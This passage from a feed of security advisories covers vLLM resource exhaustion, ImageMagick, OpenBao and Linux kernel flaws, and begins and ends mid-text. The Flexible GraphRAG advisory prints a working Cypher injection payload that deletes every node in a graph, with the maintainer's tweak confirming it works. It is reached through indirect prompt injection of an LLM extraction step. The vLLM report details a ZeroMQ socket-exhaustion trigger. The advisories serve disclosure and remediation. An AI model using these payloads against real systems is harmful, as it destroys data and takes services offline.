Public PR [#53610](https://github.com/vllm-project/vllm/pull/53610) refactors the MiniMax adapter but continues forwarding the processor kwargs without these checks. PR [#54935](https://github.com/vllm-project/vllm/pull/54935) fixes request-driven video sampling work in GLMGA, a different processor and sink. I therefore consider this report a MiniMax M3 sibling omitted from the public geometry-amplification work, rather than a separate vulnerability class. It may belong under the same advisory family at the maintainers' discretion.

Suggested remediation is to validate the merged processor values before allocation, including positive numeric bounds and `min_pixels <= max_pixels`, and to enforce `resized_height * resized_width * num_frames <= max_total_pixels` regardless of the selected resize mode. The check should run before `self.resize`.

### Impact

The established impact is attacker-influenced CPU allocation and computation before request-level engine validation. On an exposed MiniMax M3 VL deployment, a permitted inference client can submit video work that consumes memory and CPU far out of proportion to the decoded input. Depending on available memory and process supervision, this may cause allocation failure, worker termination, restart, or temporary loss of service.

The finding does not establish confidentiality or integrity impact. It also does not establish a reliable crash threshold for every deployment. API authentication, proxy request limits, and host memory affect attack cost, but they do not enforce the missing relationship and volumetric checks inside the processor.

## Affected versions

- Package: `vllm` (PyPI).
- Affected versions: `>= 0.24.0, < 0.31.0`.
- First stable patched version: `0.31.0`.

PR #58830 blocks untrusted per-request `mm_processor_kwargs` and `media_io_kwargs` by default before preprocessing. Keep `--trust-request-mm-kwargs` disabled for untrusted clients. Explicitly enabling it restores trusted override behavior; the underlying processor/sampler is not independently bounded by this fix.

Advisory fixed in [#58830](https://github.com/vllm-project/vllm/pull/58830).

OpenBao before 2.6.4 and 2.7.x before 2.7.1 does not verify, when renewing a token issued by the Kubernetes Auth method, that the service account token originally used to authenticate is still valid. An authenticated attacker can keep renewing such tokens to persist access after the Kubernetes service account has been deleted.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 incorrectly parses delegate invocations, which can allow an executable blocked in policy.xml to still run. An attacker who gets ImageMagick to process input that triggers a delegate invocation can bypass the administrator-defined policy and execute the blocked program.

ImageMagick before 7.1.2-33 contains a heap buffer over-read vulnerability that allows attackers to read beyond allocated memory when printing a minimum-bounding-box. Attackers can supply a crafted image that triggers the over-read during minimum-bounding-box output, causing crashes or exposing adjacent heap memory.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a policy bypass in the PS, PDF and XPS decoders that allows the security policy's list length limit on scene selection to be circumvented. Attackers supplying a specific argument can cause ImageMagick to process more scenes than permitted, potentially exhausting resources.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains uncontrolled recursion in the MVG decoder that can lead to a stack overflow. Attackers can supply a crafted MVG file that, when read with specific arguments, exhausts the stack and crashes the process, causing a denial of service.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains an injection vulnerability in the MVG encoder, which does not properly neutralize user-specified drawing options before writing them into generated MVG output. Attackers who can supply drawing options can inject arbitrary MVG drawing commands into the resulting MVG file.

ImageMagick before 7.1.2-33 contains a memory leak vulnerability in the FPX encoder that allows attackers to exhaust memory by supplying a crafted image. Attackers can submit crafted images for FPX encoding to leak memory repeatedly, causing resource exhaustion and denial of service.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak caused by a missing cleanup when the -set profile option is used. An attacker who induces a user to process images with the -set profile option can leak memory, potentially exhausting resources and causing a denial of service.

ImageMagick before 7.1.2-33 contains a memory leak vulnerability in PerlMagick that fails to free values returned when reading image properties. Attackers can repeatedly trigger property reads through five affected PerlMagick code locations to exhaust memory and cause denial of service.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in the handling of the -cdl (color decision list) option, where allocated memory is not cleaned up after use. Attackers can supply input that causes the -cdl option to be processed, repeatedly leaking memory and degrading availability through resource exhaustion.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a heap-based buffer overflow in the X11 animate operation when processing crafted images. Attackers can supply a malicious image that, when a user runs an X11 animate operation on it, overwrites heap memory and can crash the application.

vLLM from 0.8.5 before 0.31.0 has a denial of service flaw. LogprobsTensors.empty_cpu() in vllm/v1/outputs.py allocates an uninitialized int32 tensor, and the V1 model runner leaves prompt positions reported as computed by a KV connector unwritten. A client sharing the engine can send prompt_logprobs (or echo with logprobs) against a connector-cached prefix, making tokenizer decode raise OverflowError, which crashes EngineCore and drops all co-tenant requests.

items.title: vllm p2p never connected zmq_exhaustion
items.description:
### Summary

When the `OffloadingConnector` uses `TieringOffloadingSpec` with a P2P secondary tier, an API client can submit many unique non-listening peer addresses through `kv_transfer_params.prefill`. vLLM keeps every never-established P2P session and its ZeroMQ sockets after the request finishes. On vLLM 0.26.0, 340 such peers filled the default ZeroMQ context socket quota; creating the next peer raised an uncaught `ZMQError`, terminated `EngineCore`, and shut down the API server. The path was reproduced with a normal API key and no access to the internal P2P listener.

### Details

#### Root cause

In vLLM 0.26.0, `P2PSecondaryTierManager.on_new_request()` reads the following request-controlled fields:

```json
{
  "kv_transfer_params": {
    "prefill": {
      "kv_request_id": "id",
      "remote_host": "127.0.0.1",
      "remote_port": 49101
    }
  }
}
```

`on_new_request()` calls `_get_or_create_session(peer_id)`. This calls `ZmqTransport.connect()`, creates a `P2PSession`, and stores it in `_sessions` before the asynchronous ZeroMQ connection has been established.

`ZmqTransport._open_connection()` creates a DEALER, enables a libzmq monitor, creates a PAIR socket for that monitor, calls `dealer.connect()`, and immediately stores the resulting `ZmqConnection` in `_connections`. Returning from `dealer.connect()` does not prove that the peer is reachable.

The monitor subscribes only to `zmq.EVENT_DISCONNECTED`. A peer that never accepts the initial connection produced `EVENT_CONNECT_DELAYED`, `EVENT_CONNECT_RETRIED`, and `EVENT_CLOSED`, but no `EVENT_DISCONNECTED` during a 60-second observation. The production monitor therefore never calls `mark_dead()`, and `ZmqConnection.alive` remains true.

Request completion calls `session.finish_request()`, but does not close or remove the peer session. The manager reaps only a session for which `session.connected and not session.alive` is true. A never-established peer remains `connected=True`, `alive=True`, and `ready=False`. There is no establishment deadline, idle eviction, or limit on pending or total peers.

Each unique retained peer uses about three sockets in the same ZeroMQ context: the DEALER, the monitor endpoint created by libzmq, and the PAIR monitor client. With the measured default `MAX_SOCKETS=1023`, 340 peers use approximately 1,020 sockets in addition to the local ROUTER. The next peer fails while creating its monitor PAIR. The exception escapes through `on_new_request()` and the scheduler into the EngineCore loop:

```text
P2PSecondaryTierManager._get_or_create_session()
  -> ZmqTransport.connect()
  -> ZmqTransport._open_connection()
  -> monitor_sock = self._zmq_ctx.socket(zmq.PAIR)
  -> zmq.error.ZMQError: Too many open files
  -> EngineDeadError
```

The process open-files limit was 65,536. The EngineCore had about 1,215 file descriptors at the failure point, so the failure was not the operating-system FD limit.

#### Boundary and controls

Each row below used a fresh vLLM process and pre-generated unique non-listening loopback ports.

| Test | Result |
|---|---|
| Default `MAX_SOCKETS=1023`, 340 unique peers | 340 HTTP 200 responses; 340 active peers; service healthy |
| Default limit, 344 unique peers, concurrency 4 | 340 HTTP 200 and 4 HTTP 500 responses; EngineCore and API exited |
| Default limit, 344 unique peers, concurrency 1 | Same 340-peer ceiling and service exit |
| Same endpoint repeated 512 times | 512 HTTP 200 responses; one active peer; service healthy |
| 512 requests without P2P parameters | 512 HTTP 200 responses; no active peers; service healthy |

A diagnostic A/B changed only the context `MAX_SOCKETS` value. Raising it from 1,023 to 2,048 moved the last fully successful point from 340 to 682 peers. The 683rd peer then raised the same `ZMQError` and terminated the service. The approximately 2.01x movement in the boundary identifies the ZeroMQ context quota as the exhausted resource.

The failure runs used logging-only instrumentation around `_open_connection()` to record the context limit, peer count, and process FD count. It did not add or close any ZeroMQ socket and re-raised the original exception.

#### Related public work

[PR #47843](https://github.com/vllm-project/vllm/pull/47843) is an open, unmerged proposal that identifies client-supplied P2P peer addresses as an SSRF risk and proposes API sanitization plus a configured peer allowlist. Those changes would block this public API trigger, but the PR does not add a connection deadline, session cleanup, or a capacity limit for never-established peers. This report adds the deterministic resource-exhaustion and service-exit impact of the retained state.

[PR #49823](https://github.com/vllm-project/vllm/pull/49823) fixes cleanup and reconnection after a connection has been marked dead. A peer that never establishes does not receive the subscribed `EVENT_DISCONNECTED` event, so it never enters that dead-state cleanup path.

### Impact

This is uncontrolled resource consumption leading to denial of service. An attacker needs network access to an OpenAI-compatible inference endpoint and a normal API key when `--api-key` is enabled. The attacker does not need access to the internal P2P control or data ports and does not need any peer to answer.

Only deployments that explicitly enable `OffloadingConnector`, `TieringOffloadingSpec`, and a P2P secondary tier are affected. Repeating a cheap one-token request with unique non-listening endpoints steadily consumes scheduler and ZeroMQ resources. In the tested default context, about 341 requests were enough to terminate EngineCore and stop all inference on the instance until restart. Confidentiality and integrity were not affected; the demonstrated impact is availability loss.

This advisory was fixed in [MR51504](https://github.com/vllm-project/vllm/pull/51504).

vLLM is an inference and serving engine for large language models. Prior to 0.32.0, an authenticated caller can place forged shared-memory address and monotonic_id values in public multimodal features.kwargs_data. In scale-out deployments with shared-memory multimodal caching enabled, workers trust those values and pass attacker-selected bytes to pickle.loads(), allowing arbitrary Python execution even when insecure serialization is disabled. This issue is fixed in version 0.32.0.

vLLM from 0.20.1 before 0.29.0 contains an improper input validation vulnerability that allows remote attackers to crash the engine by supplying out-of-vocabulary stop_token_ids. Attackers can send OpenAI chat, completion, generate, or batch requests with invalid IDs to terminate the engine or write outside the V2 runner's logits buffer.

vLLM from 0.19.0 before 0.24.0 contains a decompression bomb vulnerability because the AudioMediaIO multimodal path calls load_audio without the max_duration_s decoded-duration limit. Authenticated attackers can send small compressed audio via input_audio or audio_url in /v1/chat/completions requests that expands to huge decoded PCM, exhausting server memory.

items.title: Flexible GraphRAG: Cypher/Graph Injection via broken string-escaping in FalkorDB adapter (_escape()) - full graph wipe from ingested-document content
items.description:
**Description**
def _escape(v: str) -> str:
    return str(v).replace("'", "\\'").replace("\\", "\\\\")
The escaping order is backwards, exactly like the classic HTML double-escape bug: step 1 inserts a literal backslash in front of every ', then step 2 re-matches that just-inserted backslash and doubles it. For an input ending in a single quote, the two steps combined produce \\' (two backslashes followed by the quote) in the output — which, under the standard backslash-escape convention used by Cypher/openCypher single-quoted string literals, is parsed as one escaped backslash followed by an unescaped, string-terminating quote. The quote is not neutralized; the string breaks open.

This escaped value is interpolated directly into Cypher query strings built by string formatting (not parameters) at 5 call sites in the same method:

self.lc_graph.query(
    f"MERGE (n:`{node.type}` {{id: '{_escape(node.id)}'}}) "
    f"{props}"
    f"RETURN distinct 'done' AS result"
)
...
self.lc_graph.query(
    f"MATCH (a:`{rel.source.type}` {{id: '{_escape(rel.source.id)}'}}), "
    f"(b:`{rel.target.type}` {{id: '{_escape(rel.target.id)}'}}) "
    f"MERGE (a)-[r:`{rel_type}`]->(b) "
    f"{props}"
    f"RETURN distinct 'done' AS result"
)
node.type, rel.source.type, rel.target.type and rel_type are also interpolated into backtick-quoted identifiers with no escaping at all.

Where the attacker-controlled data comes from: node/rel objects are LLM-extracted entities and relationships derived from ingested document content (the whole point of this GraphRAG pipeline). Document content is therefore untrusted input relative to this database layer — a classic indirect-prompt-injection-to-query-injection chain: craft a document whose text causes the extraction LLM to produce an entity id containing the payload below, ingest it, and the broken escape function turns it into live Cypher.

**Impact**
Full Cypher clause injection into lc_graph.query() calls that run with no query parameterization and no read-only restriction visible in this adapter. Demonstrated impact: appending a second clause (MATCH (m) DETACH DELETE m) to the query wipes every node and relationship in the graph in a single call. The same primitive can be adapted to exfiltrate data (e.g. RETURN other nodes' properties back through a field the caller reads) or tamper with existing records, depending on what the calling code surfaces to the end user/LLM.

Proof of Concept (executed, full query reconstruction)
Only the two-line _escape() function and the f-string template were executed — no import of the flexible-graphrag package itself.

raw attacker-controlled node.id:
"pwn' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //"
output of buggy _escape():
"pwn\\' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //"
full query string actually sent to lc_graph.query():
MERGE (n:`Entity` {id: 'pwn\\' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //'}) RETURN distinct 'done' AS result
Parse trace (standard backslash-escape convention for single-quoted Cypher strings):

Opening ' starts the id string literal.
pwn is consumed literally.
\\ (two backslash chars) is consumed as one escaped-backslash sequence — the string now holds one literal backslash.
The very next character is an unescaped ' — this closes the string literal early. id value ends up as "pwn\" (with a trailing backslash).
The remaining text }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //... is now parsed as live Cypher syntax, not string content.
}) closes the property map and the node pattern — completing a valid MERGE clause.
MATCH (m) DETACH DELETE m RETURN count(m) AS pwn is a second, fully valid Cypher clause chained immediately after the MERGE (Cypher allows sequential clauses with no separator).
// starts a line comment, consuming the rest of the original template ('}) RETURN distinct 'done' AS result) so it never executes.
Effective query the database actually receives:

MERGE (n:`Entity` {id: 'pwn\'}) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn
- a syntactically complete, two-clause Cypher statement that creates one throwaway node and then deletes the entire graph.

Suggested Fix
Escape \ before ' (fixes the ordering bug, same class of fix as the litellm report):
def _escape(v: str) -> str:
    return str(v).replace("\\", "\\\\").replace("'", "\\'")
Stronger fix, recommended in addition: use FalkorDB's parameterized query support (lc_graph.query(query, params={...})) instead of string interpolation entirely, and reject/escape backtick characters in node.type/rel_type/rel.source.type/rel.target.type before using them as label/relationship-type identifiers (these have no escaping at all today).
One caveat (same as original internal triage)
This was verified as a pure string-construction bug (steps 1-8 above are executed, not hypothesized) and confirmed against FalkorDB's Cypher-compatible documentation's stated backslash-escape convention for string literals, but was not run against a live FalkorDB instance to observe the parser's exact behavior byte-for-byte. If FalkorDB's dialect deviates from this convention, the specific PoC payload above may need minor adjustment — the underlying escape-ordering defect itself is confirmed either way.

Maintainer note: confirmed exploitable against a live FalkorDB. FalkorDB requires a WITH
between MERGE and MATCH, so the payload needs "WITH 1 AS x" added; with it, the payload
deleted every node in the graph. Fixed in 0.8.2: values are passed as query parameters and
labels/relationship types/property keys are stripped of backticks.

Affected configuration: GRAPH_BACKEND=langchain with GRAPH_DB=falkordb only. The LlamaIndex
FalkorDB store is not affected.

Workaround before upgrading: use GRAPH_BACKEND=llamaindex with FalkorDB, or another graph database.

In the Linux kernel, the following vulnerability has been resolved:

crypto: ccp - Fix possible deadlock in SEV init failure path

__sev_platform_init_handle_init_ex_path() calls
rmp_mark_pages_firmware() with locked=false while the parent
function of init_ex_path already acquired the sev_cmd_mutex.
In the case of an RMPUPDATE failure for any page after the first, the cleanup
path would invoke reclaim pages which would result in a deadlock in
sev_do_cmd.

Pass locked=true to honor the lock status of the parent function.

In the Linux kernel, the following vulnerability has been resolved:

freevxfs: don't BUG() on unknown typed-extent type

vxfs_bmap_typed() handles four typed-extent types and calls BUG() in
its default case, so an on-disk typed extent with any other type value
crashes the kernel. It is reachable from ioctl(FIBMAP) on a regular
file:

  kernel BUG at fs/freevxfs/vxfs_bmap.c:230!
  RIP: vxfs_bmap_typed fs/freevxfs/vxfs_bmap.c:230 [inline]
       vxfs_bmap1+0x128a/0x12d0 fs/freevxfs/vxfs_bmap.c:257

Replace the BUG() with WARN_ON_ONCE() and return 0 -- the value
vxfs_bmap_typed() already returns on failure (and from the DEV4 case
above); vxfs_getblk() maps 0 to -EIO, so the ioctl fails cleanly.

In the Linux kernel, the following vulnerability has been resolved:

netfilter: nf_conntrack_expect: zero at allocation time

There are occasional LLM hints wrt. leaking uninitialized data to
userspace via ctnetlink.  Just zero at allocation time,
expectations are not frequently used these days.

Intentionally keeps _init as-is because we could theoretically
support re-init, so add the missing exp->dir there.

In the Linux kernel, the following vulnerability has been resolved:

wifi: iwlwifi: mld: don't WARN on WoWLAN suspend w/o netdetect

Clearly, from a user perspective, it must be valid to configure
WoWLAN and then suspend while not connected to a network. Since
mac80211 doesn't distinguish these cases and simply calls the
driver to suspend whenever WoWLAN is configured, the driver has
to cleanly handle the case where it's called for WoWLAN, it's
not connected but there's also no netdetect configured.

Remove the WARN_ON() and keep returning 1 to disconnect and
then suspend.

In the Linux kernel, the following vulnerability has been resolved:

drm/nouveau/gsp: add SEC2 to GA100 chip table

The booter-load and booter-unload firmware run on the SEC2 falcon.
During tu102_gsp_oneinit(), the booter constructor needs device->sec2
to access the SEC2 falcon.

Without the .sec2 entry, device->sec2 is NULL and this dereference
crashes during GSP-RM boot.

In the Linux kernel, the following vulnerability has been resolved:

host1x: bus: Fix missing ops null check in error teardown

In host1x_device_init(), the error teardown paths do not check
client->ops before dereferencing it, unlike the forward init paths
which correctly guard with 'client->ops &&'. This can result in a
NULL pointer dereference if client->ops is NULL.

Fix by adding the missing client->ops check in both the teardown
and teardown_late labels.

In the Linux kernel, the following vulnerability has been resolved:

irqchip/gic-v4: Don't advertise VLPIs if no ITS is probed

When accidentally setting “kvm-arm.vgic_v4_enable=1” on a system that has
no MSI controller device tree node and GICv4, it results a panic as
“gic_domain” is NULL and the kernel attempts to access it.

    Unable to handle kernel NULL pointer dereference at virtual address 0000000000000028
    Mem abort info:
      ESR = 0x0000000096000006

    CPU: 1 UID: 0 PID: 295 Comm: lkvm-static Not tainted 7.1.0-rc4-ge3f15ad3970e #5 PREEMPT
    Hardware name: linux,dummy-virt (DT)
    pstate: 81402005 (Nzcv daif +PAN -UAO -TCO +DIT -SSBS BTYPE=--)
    pc : __irq_domain_instantiate+0x1d4/0x578
    lr : __irq_domain_instantiate+0x1cc/0x578

Set vLPI support to false at init time if the host has no ITS, so it
propagates properly to kvm_vgic_global_state.has_gicv4.

In the Linux kernel, the following vulnerability has been resolved:

irqchip/gic-v5: Immediately exec priority drop following activate

With GICv5 an interrupt of equal or lower priority cannot be signalled
until there has been a priority drop. This is done via the GIC CDEOI
system instruction. Once this has been executed, the hardware is able
to signal the next interrupt if there is one.

As all interrupts are programmed to have the same priority, no new
interrupts can be signalled until the priority drop has happened. This
can cause issues when, for example, an interrupt remains active while
a long running process takes place, such as when injecting a physical
interrupt into a guest VM in software.

The GICv5 driver has so far done the priority drop as part of
irq_eoi(), i.e., at the same time as deactivating the interrupt. This
means that any long running process (or VM) could block incoming
interrupts, effectively causing a denial of service for all other
interrupts.

Rather than doing the EOI as part of irq_eoi() (which the name would
suggest would be a good place for it), move it to happen immediately
after acknowledging an interrupt in the main GICv5 interrupt
handler. The deactivation of interrupts (GIC CDDI) remains implemented
as part of irq_eoi(), which means that the same interrupt cannot be
signalled a second time until deactivated by software.

In the Linux kernel, the following vulnerability has been resolved:

isofs: handle set_blocksize failures

isofs uses buffer_heads, which don't handle block size > PAGE_SIZE well.
Without this, mounting we will hit the

        BUG_ON(offset >= folio_size(folio));

in folio_set_bh on the first __bread_gfp call.

In the Linux kernel, the following vulnerability has been resolved:

ntfs3: handle set_blocksize failures

ntfs3 uses buffer_heads, which don't handle block size > PAGE_SIZE well.
Without this, mounting we will hit the

        BUG_ON(offset >= folio_size(folio));

in folio_set_bh on the first __bread_gfp call.

In the Linux kernel, the following vulnerability has been resolved:

media: chips-media: wave5: Add range checks for dec_output_info

If the driver's dec_output_info contains invalid data the driver can
write in invalid memory. Add a range check for that.

This fixes this smatch error:
drivers/media/platform/chips-media/wave5/wave5-vpuapi.c:588 wave5_vpu_dec_get_output_info() error: buffer overflow 'inst->frame_buf' 64 <= 127

In the Linux kernel, the following vulnerability has been resolved:

serial: 8250_port: recognize UPIO_AU

My MIPS Alchemy systems generate the following warning during
probe of the 8250 driver:

WARNING: drivers/tty/serial/8250/8250_port.c:462 at set_io_from_upio+0xfc/0x124, CPU#0: swapper/0/1
Unsupported UART type 4
[...]
[<80521d40>] set_io_from_upio+0xfc/0x124
[<80521dfc>] serial8250_set_defaults+0x94/0xe0
[<80520fb4>] serial8250_register_8250_port+0x288/0x51c
[<805214ec>] serial8250_probe+0x160/0x1e8
[<8053b5f0>] platform_probe+0x64/0x90

The least invasive fix is to recognize UPIO_AU (type 4) in set_io_from_upio()
and do nothing, since all parameters have already been set up in
8250_rt288x.c::au_platform_setup().

Run-tested on Alchemy Au1300 platform.

In the Linux kernel, the following vulnerability has been resolved:

mmc: core: Add validation for host-provided max_segs

The max_segs field is of type unsigned short, and if a host driver
sets an excessively large value, it may be truncated to zero. This
can cause mmc_alloc_sg() to call kmalloc_objs() with a zero size
allocation request, which leads to undefined behavior.

Under the SLUB allocator, kmalloc(0) returns a special pointer
(ZERO_SIZE_PTR). The subsequent 'if (sg)' check will evaluate to
true, and sg_init_table() will then attempt to access invalid memory,
resulting in a crash:
